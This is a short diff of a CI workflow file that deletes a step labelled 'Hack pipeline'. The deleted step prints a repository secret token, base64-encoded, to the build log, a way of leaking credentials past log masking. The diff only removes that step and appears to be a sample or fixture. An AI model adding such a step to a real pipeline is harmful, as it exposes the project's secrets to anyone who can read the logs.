@@ -12,9 +12,3 @@ jobs:
             - name: Build project
               run: |
                 echo "Building the application..."
-            - name: Hack pipeline
-              run: |
-                echo "Leaking secret"
-                echo "$TOKEN" | base64
-              env:
-                TOKEN: ${{secrets.SECRET_TOKEN}}
